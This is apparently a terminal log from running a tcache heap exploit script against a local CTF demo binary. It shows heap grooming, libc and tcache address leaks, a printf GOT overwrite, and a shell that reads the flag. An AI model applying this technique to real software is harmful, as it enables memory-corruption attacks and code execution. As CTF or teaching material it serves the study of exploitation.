```
python3 pwn-tcache.py BIN=./heapchall_patched 
[*] Loading gadgets for '/demos/tcache-demo/heapchall_patched'
[+] Starting local process '/demos/tcache-demo/heapchall_patched': pid 4905
[*] Allocating 0,128
[*] Allocating 1,128
[*] Allocating 2,128
[*] Allocating 3,128
[*] Allocating 4,128
[*] Allocating 5,128
[*] Allocating 6,128
[*] Allocating 7,128
[*] Allocating 8,128
[*] Allocating 9,128
[*] Freeing slot: 0
[*] Freeing slot: 1
[*] Freeing slot: 2
[*] Freeing slot: 3
[*] Freeing slot: 4
[*] Freeing slot: 5
[*] Freeing slot: 6
[*] Freeing slot: 7
[*] Freeing slot: 8
[*] Freeing slot: 9
[*] Leaking slot: 0 with 0x183c
[*] Leaking slot: 1 with 0x183da9c
[*] Leaking slot: 7 with 0x7f07a6407ce0
[*] Libc Leak Found: 0x7f07a61ee000
[*] Tcache Leak Found: 0x183c2a0
[*] 0x404048 (Malloc) & 0f == 0x8 
[*] 0x404040 (Printf) & 0f == 0x0 
[*] Ovewriting with printf because e.got['printf'] & 0xf == 0x0
[*] Editing slot: 6 with b'|X@\x00\x00\x00\x00\x00'
[*] Paused (press any to continue)
[*] Allocating 0,128
[*] Paused (press any to continue)
[*] Allocating 1,128
[*] Paused (press any to continue)
[*] Editing slot: 1 with b'\x16\x12@\x00\x00\x00\x00\x00'
[*] Switching to interactive mode
 Winner winner, chicken dinner!
$ cat flag.txt
flag{i_sure_wish_it_worked_remotely}
```
